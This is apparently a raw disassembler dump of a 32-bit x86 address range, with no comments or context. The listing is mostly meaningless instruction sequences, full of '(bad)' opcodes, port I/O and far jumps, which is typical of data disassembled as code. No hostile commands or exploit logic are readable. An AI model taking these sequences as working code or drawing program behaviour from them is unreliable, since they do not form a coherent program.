  40e9b1:	sbb    esi,DWORD PTR [ecx-0x78]
  40e9b4:	scas   al,BYTE PTR es:[edi]
  40e9b5:	std    
  40e9b6:	mov    ds:0x853bb0e6,al
  40e9bb:	mov    ebp,0x15b6145b
  40e9c0:	sar    DWORD PTR cs:[edx+0x69ff0dfb],1
  40e9c7:	xlat   BYTE PTR ds:[ebx]
  40e9c8:	push   ebx
  40e9c9:	jb     0x40e989
  40e9cb:	inc    eax
  40e9cc:	das    
  40e9cd:	inc    ebx
  40e9ce:	xor    DWORD PTR [esi],esp
  40e9d0:	out    0x79,eax
  40e9d2:	mov    esp,0x51958579
  40e9d7:	nop
  40e9d8:	jg     0x40ea0f
  40e9da:	push   ebp
  40e9db:	fcmovnu st,st(3)
  40e9dd:	sub    eax,0x20b8f4a8
  40e9e2:	std    
  40e9e3:	fild   WORD PTR ds:[edx]
  40e9e6:	cmp    BYTE PTR [edi+0x8ffd25f],cl
  40e9ec:	mov    dl,al
  40e9ee:	loop   0x40e97a
  40e9f0:	xchg   ebp,eax
  40e9f1:	cmp    cl,BYTE PTR [ebx+0xa]
  40e9f4:	and    DWORD PTR [edx-0x45cacd10],ebp
  40e9fa:	fimul  DWORD PTR [edx+0x16]
  40e9fd:	dec    esp
  40e9fe:	sub    edx,DWORD PTR [eax+0x3b]
  40ea01:	jmp    0x792c:0xa7235252
  40ea08:	aad    0x57
  40ea0a:	imul   eax,DWORD PTR [edi+0x18d398c5],0xb79e3b48
  40ea14:	mov    ebx,0xffac9b7a
  40ea19:	sbb    cl,BYTE PTR [edx]
  40ea1b:	scas   al,BYTE PTR es:[edi]
  40ea1c:	stc    
  40ea1d:	or     DWORD PTR ds:0xdc407dcc,ebp
  40ea23:	push   ebx
  40ea24:	loopne 0x40e9d4
  40ea26:	(bad)  
  40ea27:	dec    esp
  40ea28:	adc    al,0xf1
  40ea2a:	jae    0x40ea03
  40ea2c:	xchg   ebp,eax
  40ea2d:	pop    eax
  40ea2e:	ds jl  0x40ea08
  40ea31:	sbb    ah,BYTE PTR [esp+esi*8-0x47cfc587]
  40ea38:	out    dx,eax
  40ea39:	sbb    edi,DWORD PTR [ebp-0x64]
  40ea3c:	retf   0x4104
  40ea3f:	mov    dh,0xd3
  40ea41:	aam    0x4e
  40ea43:	outs   dx,DWORD PTR ds:[esi]
  40ea44:	(bad)  
  40ea45:	out    dx,al
  40ea46:	xchg   edi,eax
  40ea47:	add    al,0x4d
  40ea49:	add    ebp,DWORD PTR [ecx-0x2a]
  40ea4c:	sti    
  40ea4d:	adc    al,0x1f
  40ea4f:	lock push ss
  40ea51:	xchg   edx,eax
  40ea52:	mov    bh,0x1c
  40ea54:	mov    bh,0x29
  40ea56:	je     0x40ea82
  40ea58:	(bad)  
  40ea59:	push   esi
  40ea5a:	out    0xaf,eax
  40ea5c:	pop    es
  40ea5d:	xchg   BYTE PTR [esi+esi*8-0x7a],ch
  40ea61:	dec    ecx
  40ea62:	sub    dl,ch
  40ea64:	adc    ebp,DWORD PTR [edx-0x4d]
  40ea67:	mov    ebx,0xf5c81b26
  40ea6c:	sbb    eax,DWORD PTR [ebp-0x1e]
  40ea6f:	push   ecx
  40ea70:	(bad)  
  40ea71:	(bad)  
  40ea72:	and    ah,BYTE PTR [edx-0x9]
  40ea75:	mov    gs,ecx
  40ea77:	es jb  0x40ea57
  40ea7a:	les    esi,FWORD PTR ds:[edi+0x54b30d73]
  40ea81:	ss sub ecx,eax
  40ea84:	mov    cl,0xc5
  40ea86:	int3   
  40ea87:	(bad)  
  40ea88:	ja     0x40ea71
  40ea8a:	sub    DWORD PTR [ebx],eax
  40ea8c:	mov    WORD PTR ds:0x1a925429,ss
  40ea92:	mov    edx,0xedc23ed
  40ea97:	pop    edx
  40ea98:	loope  0x40eb03
  40ea9a:	cmp    eax,0xa3b08385
  40ea9f:	xor    eax,0xb4bca24
  40eaa4:	cmp    bl,ah
  40eaa6:	xor    ebx,0xb75d1df6
  40eaac:	retf   
  40eaad:	fdivp  st(6),st
  40eaaf:	es inc ebx
  40eab1:	unpcklps xmm2,XMMWORD PTR [eax-0x174f70c8]
  40eab8:	inc    eax
  40eab9:	push   edx
  40eaba:	mov    bl,0x24
  40eabc:	es es push 0x2c28cd0b
  40eac3:	(bad)  
  40eac4:	mov    eax,0x5a331910
  40eac9:	les    eax,FWORD PTR [ebx-0x29941908]
  40eacf:	lock js 0x40eb0c
  40ead2:	sahf   
  40ead3:	aas    
  40ead4:	sbb    bh,ah
  40ead6:	lahf   
  40ead7:	mov    esi,0x96fa64e0
  40eadc:	sbb    DWORD PTR [esi+0x51],ecx
  40eadf:	jmp    0xc8258adf
  40eae4:	cdq    
  40eae5:	inc    edx
  40eae6:	jnp    0x40eb4b
  40eae8:	push   ebx
  40eae9:	ja     0x40eb00
  40eaeb:	cs add al,0x8c
  40eaee:	dec    edx
  40eaef:	pop    ecx
  40eaf0:	arpl   di,cx
  40eaf2:	mov    al,ds:0xeb3de4cc
  40eaf7:	fistp  DWORD PTR [ecx]
  40eaf9:	cdq    
  40eafa:	stos   DWORD PTR es:[edi],eax
  40eafb:	push   edx
  40eafc:	neg    BYTE PTR [edx+0x225caa42]
  40eb02:	cmp    ebp,edi
  40eb04:	pushf  
  40eb05:	xor    eax,0x59efc846
  40eb0a:	xchg   BYTE PTR [edx+ecx*8+0x2edfadab],dl
  40eb11:	inc    ebx
  40eb12:	adc    al,0x91
  40eb14:	fdivr  DWORD PTR [ebx]
  40eb16:	leave  
  40eb17:	xchg   ebx,eax
  40eb18:	nop
  40eb19:	jge    0x40eb90
  40eb1b:	test   eax,0xdf26387
  40eb20:	dec    esp
  40eb21:	push   ss
  40eb22:	scas   eax,DWORD PTR es:[edi]
  40eb23:	xchg   ebp,eax
  40eb24:	outs   dx,DWORD PTR ds:[esi]
  40eb25:	loope  0x40eb5e
  40eb27:	(bad)  
  40eb29:	not    DWORD PTR [esi]
  40eb2b:	scas   eax,DWORD PTR es:[edi]
  40eb2c:	bound  ecx,QWORD PTR [edx+0x8d410ec]
  40eb32:	xor    cl,cl
  40eb34:	push   ebp
  40eb35:	ror    DWORD PTR [edx+0x3aa2166d],cl
  40eb3b:	loopne 0x40eb22
  40eb3d:	sbb    eax,esp
  40eb3f:	dec    esi
  40eb40:	cmp    eax,0xa6c8087d
  40eb45:	loopne 0x40ebaa
  40eb47:	dec    edi
  40eb48:	xchg   ebx,eax
  40eb49:	mov    bh,0x5b
  40eb4b:	pop    eax
  40eb4c:	mov    ds:0x2523a1e3,eax
  40eb51:	or     DWORD PTR [esi],ebx
  40eb53:	out    dx,al
  40eb54:	cld    
  40eb55:	ret    0x18b1
  40eb58:	sbb    BYTE PTR [ecx],ch
  40eb5a:	test   BYTE PTR [ecx-0x6cbdcf1f],cl
  40eb60:	cwde   
  40eb61:	or     DWORD PTR [esi-0x6b],ebp
  40eb64:	es je  0x40eb58
  40eb67:	lea    esi,[ecx+0x3d0b0cc6]
  40eb6d:	cmp    ecx,ebp
  40eb6f:	jge    0x40eb75
  40eb71:	xchg   BYTE PTR [esi+0x458057d3],cl
  40eb77:	jecxz  0x40ebdc
  40eb79:	inc    eax
  40eb7a:	in     al,0x62
  40eb7c:	loope  0x40ebdc
  40eb7e:	loop   0x40eb25
  40eb80:	mov    ebx,0x99fed005
  40eb85:	jge    0x40ebf2
  40eb87:	stc    
  40eb88:	je     0x40eb3e
  40eb8a:	and    al,0x22
  40eb8c:	adc    al,0x39
  40eb8e:	pop    eax
  40eb8f:	leave  
  40eb90:	dec    esp
  40eb91:	sub    BYTE PTR [eax],0xd5
  40eb94:	fwait
  40eb95:	cli    
  40eb96:	sti    
  40eb97:	xchg   esi,eax
  40eb98:	jo     0x40ebeb
  40eb9a:	fs push edi
  40eb9c:	inc    esi
  40eb9d:	pop    ebx
  40eb9e:	sub    eax,esp
  40eba0:	dec    ebp
  40eba1:	push   es
  40eba2:	lods   eax,DWORD PTR ds:[esi]
  40eba3:	push   cs
  40eba4:	add    BYTE PTR [ebp+ecx*4+0x1e],dh
  40eba8:	mov    dl,0x7
  40ebaa:	xor    ebx,DWORD PTR [eax]
  40ebac:	inc    esp
  40ebad:	and    bh,BYTE PTR [eax]
  40ebaf:	sahf   
  40ebb0:	lods   al,BYTE PTR ds:[esi]
  40ebb1:	adc    ecx,DWORD PTR ds:0x11506530
  40ebb7:	sbb    eax,0xe4ced894
  40ebbc:	fidivr DWORD PTR [edx]
  40ebbe:	push   edx
  40ebbf:	push   esi
  40ebc0:	mov    bh,0xdd
  40ebc2:	ja     0x40ec18
  40ebc4:	mov    bh,0xbf
  40ebc6:	xchg   edi,eax
  40ebc7:	fisubr DWORD PTR [edx+0x22]
  40ebca:	jle    0x40eb71
  40ebcc:	pop    ebp
  40ebcd:	std    
  40ebce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebcf:	xchg   edx,eax
  40ebd0:	and    eax,ebp
  40ebd2:	xchg   edi,eax
  40ebd3:	inc    edi
  40ebd4:	ja     0x40eb59
  40ebd6:	add    ecx,DWORD PTR [ecx-0x79da4b9d]
  40ebdc:	lahf   
  40ebdd:	jmp    0xf99a:0x83c1cee2
  40ebe4:	jl     0x40eb89
  40ebe6:	mov    esp,0xb82f1003
  40ebeb:	aam    0xa3
  40ebed:	in     eax,0xbc
  40ebef:	lods   eax,DWORD PTR ds:[esi]
  40ebf0:	xchg   BYTE PTR [eax],ah
  40ebf2:	sbb    al,BYTE PTR [ecx-0x58ddfc33]
  40ebf8:	sub    ch,BYTE PTR [ebx]
  40ebfa:	pop    edi
  40ebfb:	lods   al,BYTE PTR ds:[esi]
  40ebfc:	sar    DWORD PTR [esi],1
  40ebfe:	dec    ebx
  40ebff:	add    DWORD PTR [ebx],edi
  40ec01:	gs ins DWORD PTR es:[edi],dx
  40ec03:	jmp    0x40ebab
  40ec05:	stos   BYTE PTR es:[edi],al
  40ec06:	not    DWORD PTR [ebx-0x20]
  40ec09:	sbb    esi,DWORD PTR [edi]
  40ec0b:	sub    DWORD PTR [ebx-0xb],esp
  40ec0e:	push   0x6f6bfdf7
  40ec13:	pop    ss
  40ec14:	adc    bl,BYTE PTR ds:0x3811fa97
  40ec1a:	fild   DWORD PTR [edx-0x1e]
  40ec1d:	mov    ebp,0x332b33c1
  40ec22:	test   eax,0x9b93159b
  40ec27:	mov    WORD PTR [ebp+0x10],?
  40ec2a:	popf   
  40ec2b:	fisub  WORD PTR [ebx]
  40ec2d:	ror    esi,1
  40ec2f:	aaa    
  40ec30:	shl    BYTE PTR [edx+eax*2-0x13],1
  40ec34:	mov    ah,0x4c
  40ec36:	xchg   esi,eax
  40ec37:	es dec edx
  40ec39:	dec    edi
  40ec3a:	push   ss
  40ec3b:	dec    eax
  40ec3c:	lock test al,0x70
  40ec3f:	cmp    al,0x57
  40ec41:	jo     0x40ebed
  40ec43:	out    0x7,eax
  40ec45:	rcl    BYTE PTR ds:[eax+0x5],0xf5
  40ec4a:	lods   al,BYTE PTR ds:[esi]
  40ec4b:	(bad)  
  40ec4c:	shr    BYTE PTR [edx-0x6410496b],1
  40ec52:	mov    al,ds:0x82336ab2
  40ec57:	sbb    edx,DWORD PTR [edi+edx*2-0x29]
  40ec5b:	jno    0x40ec81
  40ec5d:	out    0xd5,al
  40ec5f:	mov    dh,0x29
  40ec61:	rcr    BYTE PTR [ecx+0xf7221d5],0x46
  40ec68:	cmp    eax,0xb88381df
  40ec6d:	shl    BYTE PTR [edi+0x4b98cc50],1
  40ec73:	arpl   WORD PTR [edx-0xa874501],di
  40ec79:	add    edx,DWORD PTR [ebp+0x4c]
  40ec7c:	and    DWORD PTR [edx-0x69],esp
  40ec7f:	(bad)  
  40ec82:	ret    
  40ec83:	add    BYTE PTR [edi],ch
  40ec85:	inc    ebp
  40ec86:	dec    ebp
  40ec87:	cmp    eax,0x5dd93a4f
  40ec8c:	hlt    
  40ec8d:	jne    0x40ed05
  40ec8f:	dec    eax
  40ec90:	sub    DWORD PTR [edx-0x47a603fa],edx
  40ec96:	pop    ds
  40ec97:	inc    edi
  40ec98:	ret    0x35e8
  40ec9b:	pop    ebx
  40ec9c:	rcl    DWORD PTR [eax+0x73e3e98b],1
  40eca2:	sbb    al,0x50
  40eca4:	xchg   ecx,eax
  40eca5:	fimul  DWORD PTR [edi+ebp*1]
  40eca8:	scas   al,BYTE PTR es:[edi]
  40eca9:	xor    dh,BYTE PTR [ebp+esi*4-0xb]
  40ecad:	mov    edx,0xab852649
  40ecb2:	cli    
  40ecb3:	shr    BYTE PTR [edx-0x39],0x98
  40ecb7:	mov    ah,0x37
  40ecb9:	(bad)  
  40ecba:	repz pop ss
  40ecbc:	push   ecx
  40ecbd:	pop    edx
  40ecbe:	test   al,0x4e
  40ecc0:	ss add al,0xd2
  40ecc3:	mov    eax,ds:0xde610df4
  40ecc8:	out    dx,al
  40ecc9:	xor    al,dh
  40eccb:	out    0x1d,eax
  40eccd:	stc    
  40ecce:	and    DWORD PTR [eax],esp
  40ecd0:	inc    esi
  40ecd1:	push   ebp
  40ecd2:	sbb    BYTE PTR [ebp+0x9],bh
  40ecd5:	push   ebx
  40ecd6:	mov    BYTE PTR ds:[esi-0x21c87e6c],al
  40ecdd:	aas    
  40ecde:	sbb    cl,BYTE PTR [ebx-0x5146d03b]
  40ece4:	cmc    
  40ece5:	cmp    eax,0x3eb0e335
  40ecea:	rcl    BYTE PTR ds:0x8a907c1,0xd8
  40ecf1:	cmc    
  40ecf2:	enter  0x6b80,0x37
  40ecf6:	xor    BYTE PTR [eax],0xc1
  40ecf9:	add    al,0x21
  40ecfb:	leave  
  40ecfc:	add    eax,DWORD PTR [ebx-0x59ec9985]
  40ed02:	sub    BYTE PTR [edi+0x2560470c],bh
  40ed08:	jmp    0x40ec96
  40ed0a:	adc    al,0x6e
  40ed0c:	inc    ecx
  40ed0d:	xor    BYTE PTR ds:0x77a739c4,bl
  40ed13:	out    0xb8,eax
  40ed15:	ds fwait
  40ed17:	repz test DWORD PTR [edi-0x633dae5e],esp
  40ed1e:	jno    0x40ed3e
  40ed20:	fisub  WORD PTR [edi+edi*1+0x53]
  40ed24:	mov    esi,0x320a1e1
  40ed29:	ja     0x40ed11
  40ed2b:	cmp    eax,0xa5b3ba8d
  40ed30:	xor    edx,0xffffffde
  40ed33:	mov    edi,0x9b703e89
  40ed38:	in     al,dx
  40ed39:	mov    ch,0x5e
  40ed3b:	ja     0x40ed1e
  40ed3d:	(bad)  
  40ed3e:	scas   al,BYTE PTR es:[edi]
  40ed3f:	mov    ebp,edi
  40ed41:	call   0x223f2578
  40ed46:	stos   DWORD PTR es:[edi],eax
  40ed47:	data16 xor BYTE PTR [esp+ebx*2+0x32],0xd1
  40ed4d:	ds push edx
  40ed4f:	cmc    
  40ed50:	mov    esi,0x24172ae4
  40ed55:	jne    0x40ed10
  40ed57:	adc    DWORD PTR [ebp-0x53],ebx
  40ed5a:	test   al,0xe
  40ed5c:	in     al,0xd7
  40ed5e:	inc    edi
  40ed5f:	adc    ah,BYTE PTR [eax]
  40ed61:	xchg   esi,eax
  40ed62:	imul   edx,DWORD PTR [ecx-0x2fb9e7f5],0x1319c258
  40ed6c:	test   al,0x15
  40ed6e:	mov    ecx,0xe4527a34
  40ed73:	mov    edi,0x560b47de
  40ed78:	lods   al,BYTE PTR ds:[esi]
  40ed79:	mov    al,ds:0xc83ebd94
  40ed7e:	dec    al
  40ed80:	xchg   edi,eax
  40ed81:	test   eax,0x568d0b30
  40ed86:	jmp    0xac4b:0xe21e3b8e
  40ed8d:	bound  ecx,QWORD PTR [eax]
  40ed8f:	cld    
  40ed90:	sbb    eax,0xf2378145
  40ed95:	mov    al,ds:0x77313d4b
  40ed9a:	fistp  DWORD PTR [edx]
  40ed9c:	mov    ah,0x38
  40ed9e:	jbe    0x40ed27
  40eda0:	sahf   
  40eda1:	pop    ecx
  40eda2:	mov    ds,WORD PTR [eax+0x12c1fc]
  40eda8:	fsubrp st(3),st
  40edaa:	add    edx,esi
  40edac:	enter  0x4106,0x95
  40edb0:	neg    esp
  40edb2:	pop    ebx
  40edb3:	arpl   WORD PTR [esi],dx
  40edb5:	mov    edi,0x933da1bd
  40edba:	push   edx
  40edbb:	outs   dx,BYTE PTR ds:[esi]
  40edbc:	cdq    
  40edbd:	adc    dh,BYTE PTR [ecx+0x12]
  40edc0:	test   DWORD PTR [esi-0x5adeb18c],esp
  40edc6:	xchg   ecx,eax
  40edc7:	push   esi
  40edc8:	inc    eax
  40edc9:	sbb    DWORD PTR [ebx+0x70bdfe5e],ebp
  40edcf:	jmp    0x44002ff0
  40edd4:	ror    DWORD PTR [edx-0xe44c9c3],1
  40edda:	in     eax,dx
  40eddb:	mov    BYTE PTR [ebx],bh
  40eddd:	xor    al,0xcc
  40eddf:	adc    BYTE PTR [ecx+0x1c],0x17
  40ede3:	lods   al,BYTE PTR ds:[esi]
  40ede4:	mov    edi,0x6296f27b
  40ede9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edeb:	add    eax,0xc2f8c64d
  40edf0:	popf   
  40edf1:	arpl   WORD PTR [ebx],ax
  40edf3:	fst    QWORD PTR [edi+edx*4+0x43a6d9a9]
  40edfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edfb:	xchg   bh,bl
  40edfd:	or     cl,BYTE PTR [eax-0x43]
  40ee00:	les    edi,FWORD PTR [ebx]
  40ee02:	clc    
  40ee03:	rcl    DWORD PTR [ebp+ebp*2+0x36],1
  40ee07:	sbb    esi,DWORD PTR [edi-0x5d]
  40ee0a:	pusha  
  40ee0b:	mov    esp,0xe62100b4
  40ee10:	aaa    
  40ee11:	(bad)  [esi+0x11]
  40ee14:	sub    eax,0xc4ffcfd5
  40ee19:	inc    ecx
  40ee1a:	shl    DWORD PTR [ebp+0x2b],1
  40ee1d:	rcr    BYTE PTR fs:[esi-0x5c],cl
  40ee21:	mov    ds:0x82da93c5,eax
  40ee26:	mov    edx,0x29035f81
  40ee2b:	test   DWORD PTR [esi+0x2e],edx
  40ee2e:	call   0x99c3:0xdf986f69
  40ee35:	into   
  40ee36:	dec    esi
  40ee37:	xchg   ecx,eax
  40ee38:	stos   DWORD PTR es:[edi],eax
  40ee39:	xchg   BYTE PTR [ebx-0x4cb54f5a],bl
  40ee3f:	pop    esp
  40ee40:	sub    edx,eax
  40ee42:	push   edx
  40ee43:	inc    ebx
  40ee44:	clc    
  40ee45:	jae    0x40eec2
  40ee47:	xor    al,0x7c
  40ee49:	dec    ecx
  40ee4a:	fmul   DWORD PTR [ebx]
  40ee4c:	and    ah,BYTE PTR [edi+0x1a]
  40ee4f:	push   ss
  40ee50:	mov    edi,0x993919aa
  40ee55:	dec    eax
  40ee56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee57:	add    BYTE PTR [edi],ah
  40ee59:	add    bl,BYTE PTR ds:0xcbc8677e
  40ee5f:	call   0xea6eb7
  40ee64:	fistp  QWORD PTR [esi]
  40ee66:	mov    ch,0x3e
  40ee68:	add    DWORD PTR [ebp+0x4b],esi
  40ee6b:	jmp    0x40ee45
  40ee6d:	enter  0xb1d0,0x95
  40ee71:	jmp    0x72147173
  40ee76:	jae    0x40ee23
  40ee78:	pop    ds
  40ee79:	je     0x40ee08
  40ee7b:	(bad)  
  40ee7c:	sti    
  40ee7d:	and    DWORD PTR [eax-0xe435321],ebx
  40ee83:	pop    ecx
  40ee84:	mov    WORD PTR [ebx+0x35c7b4db],es
  40ee8a:	(bad)
  40ee8d:	ror    DWORD PTR [edi-0x6d10a7fc],cl
  40ee93:	push   ebx
  40ee94:	std    
  40ee95:	add    ecx,DWORD PTR [edi]
  40ee97:	lea    ebx,[esi+0x53]
  40ee9a:	out    0xf2,eax
  40ee9c:	jno    0x40ee8b
  40ee9e:	push   0xd0c356fe
  40eea3:	scas   eax,DWORD PTR es:[edi]
  40eea4:	pop    esp
  40eea5:	imul   ecx,DWORD PTR [edx+edx*4],0x67
  40eea9:	dec    ebp
  40eeaa:	fcomp  DWORD PTR [eax-0x57]
  40eead:	sub    eax,0xe97d45c0
  40eeb2:	test   BYTE PTR [esi-0x12baa3a6],al
  40eeb8:	sbb    ebx,DWORD PTR [eax]
  40eeba:	mov    eax,DWORD PTR [esi+0x298038ab]
  40eec0:	test   eax,0xc58dc1b1
  40eec5:	cwde   
  40eec6:	cli    
  40eec7:	test   BYTE PTR [edx+0x70],ah
  40eeca:	pushf  
  40eecb:	pop    eax
  40eecc:	lods   al,BYTE PTR ds:[esi]
  40eecd:	retf   0xe80b
  40eed0:	idiv   DWORD PTR [edi-0x21]
  40eed3:	ins    BYTE PTR es:[edi],dx
  40eed4:	dec    esp
  40eed5:	or     eax,0x206b5933
  40eeda:	(bad)  
  40eedb:	pop    esi
  40eedc:	or     eax,0x8a0d1453
  40eee1:	fucomi st,st(7)
  40eee3:	test   DWORD PTR [ecx+0xc],eax
  40eee6:	(bad)  
  40eee7:	jb     0x40ee87
  40eee9:	imul   ecx,edi,0xffffffd2
  40eeec:	out    0x1f,eax
  40eeee:	xchg   ebp,eax
  40eeef:	shr    BYTE PTR [eax],cl
  40eef1:	xchg   DWORD PTR [ecx+0x43c4e52f],ebp
  40eef7:	aaa    
  40eef8:	push   0xffffffca
  40eefa:	repz mov ah,0xdd
  40eefd:	jne    0x40eef1
  40eeff:	jecxz  0x40eea3
  40ef01:	test   al,0xab
  40ef03:	push   es
  40ef04:	pop    ecx
  40ef05:	sbb    eax,0xb22e5f76
  40ef0a:	and    ah,bh
  40ef0c:	sbb    DWORD PTR [ebx],0x41
  40ef0f:	jo     0x40ef38
  40ef11:	les    ebx,FWORD PTR [edx+0x1c839e8]
  40ef17:	jnp    0x40ef63
  40ef19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef1a:	pusha  
  40ef1b:	fisubr WORD PTR [ebx-0x4ec3e355]
  40ef21:	jge    0x40ef89
  40ef23:	adc    ebx,DWORD PTR [ebp+edx*4+0x6a]
  40ef27:	mov    ebp,0x9069dabf
  40ef2c:	sbb    DWORD PTR [eax+0x52],eax
  40ef2f:	sbb    ch,dh
  40ef31:	push   es
  40ef32:	xchg   edx,eax
  40ef33:	ja     0x40eeb6
  40ef35:	sbb    edi,DWORD PTR [esi+0x43]
  40ef38:	in     eax,dx
  40ef39:	xchg   DWORD PTR [edx],ebp
  40ef3b:	mov    ebx,0x8fdc0196
  40ef40:	push   esi
  40ef41:	mov    ds:0xdbdbec53,eax
  40ef46:	test   BYTE PTR [ecx],al
  40ef48:	mov    dh,0x95
  40ef4a:	jns    0x40ef1a
  40ef4c:	and    edx,DWORD PTR [edx]
  40ef4e:	inc    edi
  40ef4f:	pusha  
  40ef50:	gs jb  0x40ef63
  40ef53:	repz ds jae 0x40efc8
  40ef57:	push   esp
  40ef58:	inc    ebx
  40ef59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5a:	lock rdpmc 
  40ef5d:	(bad)  
  40ef5e:	jo     0x40efde
  40ef60:	dec    esp
  40ef61:	and    edi,edx
  40ef63:	xlat   BYTE PTR ds:[ebx]
  40ef64:	mov    DWORD PTR [esi],ebp
  40ef66:	jle    0x40ef75
  40ef68:	int    0xd9
  40ef6a:	bound  edx,QWORD PTR [ebp-0x3d68a8cd]
  40ef70:	jns    0x40efde
  40ef72:	ins    BYTE PTR es:[edi],dx
  40ef73:	fmul   QWORD PTR [eax]
  40ef75:	adc    BYTE PTR [edi],ah
  40ef77:	or     al,0x41
  40ef79:	outs   dx,DWORD PTR ds:[esi]
  40ef7a:	mov    esi,0x91280a6b
  40ef7f:	mov    dl,0xf8
  40ef81:	(bad)  
  40ef82:	xlat   BYTE PTR ds:[ebx]
  40ef83:	scas   al,BYTE PTR es:[edi]
  40ef84:	nop
  40ef85:	aaa    
  40ef86:	adc    BYTE PTR [edi+edx*8+0x416e7077],bh
  40ef8d:	cs mov ch,0xea
  40ef90:	je     0x40ef7f
  40ef92:	mov    ds:0x9b9ba932,eax
  40ef97:	or     bl,BYTE PTR [edi]
  40ef99:	enter  0x3f16,0x16
  40ef9d:	gs (bad) 
  40ef9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa0:	xchg   ebp,eax
  40efa1:	xchg   edx,eax
  40efa2:	and    ecx,eax
  40efa4:	sbb    DWORD PTR [ecx+eax*4+0x54f1f238],eax
  40efab:	adc    bl,BYTE PTR [esi+0x2ea0fff1]
  40efb1:	bound  ecx,QWORD PTR [edi-0xc33c078]
  40efb7:	sahf   
  40efb8:	out    0xc,al
  40efba:	or     al,0xac
  40efbc:	or     ecx,0xcb5f8344
  40efc2:	mov    ds:0xac11b9ce,al
  40efc7:	or     ch,BYTE PTR [esi+0x22]
  40efca:	xor    BYTE PTR [ecx+ebp*4+0x6c5db5ba],ch
  40efd1:	mov    ch,0xba
  40efd3:	lods   eax,DWORD PTR ds:[esi]
  40efd4:	or     ebx,DWORD PTR [ebp-0x1d]
  40efd7:	cmp    eax,0xe7f13d0f
  40efdc:	bound  ebp,QWORD PTR [edi-0x22]
  40efdf:	test   eax,0xfd33a099
  40efe4:	daa    
  40efe5:	sub    dl,BYTE PTR [edi-0x2fbc303a]
  40efeb:	mov    bl,0xb0
  40efed:	(bad)  
  40efee:	hlt    
  40efef:	pop    edx
  40eff0:	call   0xf68c:0xdece3041
  40eff7:	xor    BYTE PTR [ebx+0x72],ch
  40effa:	xor    DWORD PTR [esi+0xba767f5],esi
  40f000:	(bad)  
  40f002:	jo     0x40efa2
  40f004:	xlat   BYTE PTR ds:[ebx]
  40f005:	ja     0x40efcf
  40f007:	icebp  
  40f008:	inc    edi
  40f009:	pop    edi
  40f00a:	fcmovnb st,st(7)
  40f00c:	ficom  DWORD PTR [eax-0x2a475afa]
  40f012:	add    DWORD PTR ds:0x1658ee0c,ebx
  40f018:	pop    ss
  40f019:	add    eax,0x64eab8ab
  40f01e:	cvtps2pi mm2,QWORD PTR [ebp-0x73bf199e]
  40f025:	mov    dh,0xf6
  40f027:	data16 sbb al,0x84
  40f02a:	enter  0x9783,0x99
  40f02e:	and    eax,0xcb390a81
  40f033:	adc    dh,BYTE PTR [esi]
  40f035:	ins    BYTE PTR es:[edi],dx
  40f036:	sti    
  40f037:	or     edx,DWORD PTR cs:[esi+0x5]
  40f03b:	ret    0xf9ed
  40f03e:	mov    al,0xbb
  40f040:	inc    edx
  40f041:	scas   eax,DWORD PTR es:[edi]
  40f042:	fucomi st,st(3)
  40f044:	call   DWORD PTR ds:0x6fc5d197
  40f04a:	add    al,0xa2
  40f04c:	out    dx,eax
  40f04d:	mov    dh,ch
  40f04f:	repnz imul al
  40f052:	or     eax,0xf4e58100
  40f057:	push   es
  40f058:	mov    ecx,0x930d4ad
  40f05d:	popf   
  40f05e:	mov    dh,0xc6
  40f060:	mov    ch,0x80
  40f062:	fwait
  40f063:	cdq    
  40f064:	adc    ah,BYTE PTR [edi-0x25]
  40f067:	int3   
  40f068:	jge    0x40efeb
  40f06a:	fld    TBYTE PTR [ebp+0xf]
  40f06d:	mov    al,ds:0x3ba749c1
  40f072:	mov    ch,0x55
  40f074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f075:	mov    dh,0x58
  40f077:	mov    ah,bh
  40f079:	xchg   esi,eax
  40f07a:	cwde   
  40f07b:	mov    ecx,0x0
	...
  40f0bc:	add    BYTE PTR [eax],al
  40f0be:	add    ah,ch
  40f0c0:	ss ins BYTE PTR es:[edi],dx
  40f0c2:	or     esi,edi
  40f0c4:	pop    ebx
  40f0c5:	in     eax,dx
  40f0c6:	test   DWORD PTR [edi-0x26],0xa3c9ed2
  40f0cd:	dec    eax
  40f0ce:	pop    ds
  40f0cf:	sub    edi,esi
  40f0d1:	add    BYTE PTR [eax],al
  40f0d3:	and    eax,0x5e000007
  40f0d8:	jnp    0x40f0f2
  40f0da:	shl    DWORD PTR [edi-0x33],0xbb
  40f0de:	push   0xb4a6a861
  40f0e3:	xor    al,BYTE PTR [ecx-0x4c0cef1f]
  40f0e9:	call   0x47e6717f
  40f0ee:	div    DWORD PTR [ecx+0x32023913]
  40f0f4:	pop    ebx
  40f0f5:	div    dl
  40f0f7:	iret   
  40f0f8:	gs pop ds
  40f0fa:	mov    ebp,0xc0e8d3b3
  40f0ff:	mov    DWORD PTR [ebx-0x4531f45d],0x81cb9d48
  40f109:	shl    DWORD PTR ds:0x53d98bcb,1
  40f10f:	mov    bh,0x54
  40f111:	std    
  40f112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f113:	jnp    0x40f11e
  40f115:	in     eax,0xed
  40f117:	lods   al,BYTE PTR ds:[esi]
  40f118:	mov    WORD PTR gs:[edi],fs
  40f11b:	ror    ebx,0xec
  40f11e:	add    DWORD PTR [edx+0x5a],esi
  40f121:	neg    BYTE PTR [esi+0x16e8fed3]
  40f127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f128:	jg     0x40f0d8
  40f12a:	out    dx,al
  40f12b:	pop    eax
  40f12c:	lahf   
  40f12d:	lds    edi,FWORD PTR [edx-0x3caa0914]
  40f133:	sub    bl,BYTE PTR [ecx-0x58b91991]
  40f139:	(bad)  
  40f13a:	repnz popf 
  40f13c:	mov    WORD PTR [eax+eiz*8-0x13],?
  40f140:	arpl   cx,si
  40f142:	inc    esi
  40f143:	outs   dx,BYTE PTR ds:[esi]
  40f144:	mov    bl,0xc5
  40f146:	adc    esp,DWORD PTR [eax]
  40f148:	dec    edx
  40f149:	pushf  
  40f14a:	lds    ebx,FWORD PTR [edx-0x7a]
  40f14d:	std    
  40f14e:	mov    ch,0x26
  40f150:	lahf   
  40f151:	pop    eax
